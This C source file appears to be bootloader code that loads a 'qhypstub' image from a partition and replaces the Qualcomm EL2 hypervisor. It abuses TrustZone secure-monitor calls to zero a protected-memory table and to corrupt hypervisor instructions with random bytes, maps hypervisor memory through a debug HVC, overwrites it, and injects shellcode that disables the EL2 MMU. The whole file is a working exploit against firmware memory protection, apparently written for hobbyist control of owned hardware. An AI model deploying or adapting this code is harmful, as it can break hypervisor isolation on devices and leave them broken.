#include <debug.h>
#include <scm.h>
#include <mmc.h>
#include <stdlib.h>
#include <string.h>
#include <partition_parser.h>

#define QHYPSTUB_SIZE   4096
#define QHYPSTUB_MAGIC  0x6275747370796871 // "qhypstub"

#define HYP_BASE        0x6C00000
#define HYP_SIZE        0x100000
#define HYP_PROT_TB     0x6C08800
#define HYP_BND_A       0x6C017FC
#define HYP_OLD_VECT    0x6C03800
#define HYP_NEW_VECT    0x6C019F8
#define HYP_PATCH_ADDR  (HYP_OLD_VECT + 0x600)

static int scm_zero_dword(uint32_t target)
{
	/* https://www.blackhat.com/docs/us-17/wednesday/us-17-Bazhaniuk-BluePill-For-Your-Phone.pdf */
	scmcall_arg scm_arg = {
		.x0 = 0x200030d,
		.x1 = MAKE_SCM_ARGS(0x2,SMC_PARAM_TYPE_BUFFER_READWRITE),
		.x2 = (uint32_t)target,
		.x3 = sizeof(uint32_t)
	};

	return scm_call2(&scm_arg, NULL);
}

static int scm_randomize(uint32_t target, uint32_t len)
{
	/* platform/msm_shared/scm.c */
	scmcall_arg scm_arg = {
		.x0 = MAKE_SIP_SCM_CMD(TZ_SVC_CRYPTO, PRNG_CMD_ID),
		.x1 = MAKE_SCM_ARGS(0x2,SMC_PARAM_TYPE_BUFFER_READWRITE),
		.x2 = (uint32_t)target,
		.x3 = len
	};

	return scm_call2(&scm_arg, NULL);
}

static int hyp_map_mem(uint32_t target, uint32_t len)
{
	/* https://source.codeaurora.org/quic/la/kernel/msm-3.10/tree/drivers/soc/qcom/hyp-debug.c?h=LA.BR.1.2.9.1-02310-8x16.0 */
	scmcall_arg scm_arg = {
		.hvc = true,
		.x0 = 0x82000001, /* HVC_FN_DBG_MAP_RANGE */
		.x1 = 0,          /* target_hi */
		.x2 = (uint32_t)target,
		.x3 = 0,          /* len_hi */
		.x4 = len,
		.x5 = (0b111 << 8 | 0xf << 4 | 0x0)    /* perm=rwx cache=OWB_IWT share=NS */
	};

	return scm_call2(&scm_arg, NULL);
}

static int hyp_call(uint32_t x0)
{
	int tmp;
	scmcall_ret ret = {0};
	scmcall_arg scm_arg = {
		.hvc = true,
		.x0 = x0,
	};

	tmp = scm_call2(&scm_arg, &ret);
	dprintf(SPEW, "hyp_info: x1=0x%X (%d) x2=0x%X (%d) x3=0x%X (%d)\n",
		ret.x1, ret.x1, ret.x2, ret.x2, ret.x3, ret.x3);
	return tmp;
}

static int hyp_test()
{
	scmcall_arg scm_arg = {
		.hvc = true,
		.x0 = MAKE_SIP_SCM_CMD(SCM_SVC_MILESTONE_32_64_ID, SCM_SVC_MILESTONE_CMD_ID),
	};

	return scm_call2(&scm_arg, NULL);
}

uint8_t hyp_init_patch[] =
{
	/* Load new vector address from x0 call argument */
	0x00, 0xc0, 0x1c, 0xd5, /* msr vbar_el2, x0 */
	/* Disable EL2 MMU */
	0x00, 0x10, 0x3c, 0xd5, /* mrs x0, sctlr_el2 */
	0x00, 0x78, 0x7f, 0x92, /* and x0, x0, #0xFFFFFFFE */
	0x00, 0x10, 0x1c, 0xd5, /* msr sctlr_el2, x0 */
	/* return 0 */
	0x00, 0x00, 0xe0, 0xd2, /* mov x0, #0x0 */
	0xe0, 0x03, 0x9f, 0xd6, /* eret */
};

#define iciallu() __asm__ volatile ("mcr p15, 0, %0, c7, c5, 0" : : "r" (0) : "memory");

static void hyp_replace(void *payload, int payload_size)
{
	int tmp, i = 0;
	uint32_t *dat;

	if (!is_scm_armv8_support()) {
		dprintf(CRITICAL, "32-bit firmware, cannot load qhypstub. Sad :(\n");
		return;
	}

	tmp = hyp_test();
	dprintf(CRITICAL, "hvc: ret=0x%x (%d)\n", tmp, (int)tmp);
	if (tmp != -2) {
		dprintf(INFO, "qhypstub seems to be already running\n");
		return;
	}

	dprintf(CRITICAL, "WARNING: Trying to replace the hyp!\n");

	/* Attempt 1: zero out protected addr table */
	scm_zero_dword(HYP_PROT_TB);
	scm_zero_dword(HYP_PROT_TB + 8);
	scm_zero_dword(HYP_PROT_TB + 16);

	/* try to map hyp to EL1 */
	tmp = hyp_map_mem(HYP_BASE, HYP_SIZE);
	dprintf(SPEW, "hvc: ret=0x%x (%d)\n", tmp, (int)tmp);

	if (tmp == -6) {
		dprintf(SPEW, "Falling back to instruction patching\n");
		for (i = 0; i < 10; i++) {
			/* Attempt 2: Try to patch instructions that
			 * loads start/end of protected region */
			scm_randomize(HYP_BND_A, 1);
			scm_randomize(HYP_BND_A+4, 1);
			iciallu();

			tmp = hyp_map_mem(HYP_BASE, HYP_SIZE);
			if (tmp != -6) break;
		}
	}

	/* Fail if still can't map the address.
	 * At this point hyp is probably broken but we don't need it. */
	if (tmp != 0) {
		dprintf(CRITICAL, "Failed to map hyp memory. Strange firmware? :@\n");
		return;
	}

	dprintf(INFO, "Patched hyp after %d attempts\n", i);

	/* Overwrite hyp with qhypstub */
	memcpy((void*)HYP_BASE, payload, payload_size);
	/* Load init shell code into the old interrupt vector */
	memcpy((void*)HYP_PATCH_ADDR, hyp_init_patch, 24);
	iciallu();

	/* Run init code to prepare qhypstub */
	tmp = hyp_call(HYP_NEW_VECT);
	dprintf(CRITICAL, "hvc: ret=0x%x (%d)\n", tmp, (int)tmp);
	if (tmp == 0) {
		dprintf(INFO, "qhypstub is now running. YAY! :)\n");
	}
}

void target_try_load_qhypstub()
{
	void *qhypstub_payload = NULL;
	qhypstub_payload = malloc(QHYPSTUB_SIZE);
	unsigned long long ptn = 0;
	int index = INVALID_PTN;
	bool magic_found = false;

	index = partition_get_index("qhypstub");
	ptn = partition_get_offset(index);
	if(ptn == 0) {
		dprintf(CRITICAL, "WARNING: No qhypstub partition found\n");
		return;
	}

	if (mmc_read(ptn, (unsigned int *) qhypstub_payload, QHYPSTUB_SIZE)) {
		dprintf(CRITICAL, "WARNING: Cannot read qhypstub image\n");
		return;
	}

	for (int i = 0; i < QHYPSTUB_SIZE / 8; ++i) {
		if (((uint64_t*)qhypstub_payload)[i] == QHYPSTUB_MAGIC) {
			magic_found = true;
			break;
		}
	}

	if (!magic_found) {
		dprintf(INFO, "qhypstub image lacks magic, not loading\n");
		return;
	}

	hyp_replace(qhypstub_payload, QHYPSTUB_SIZE);
}
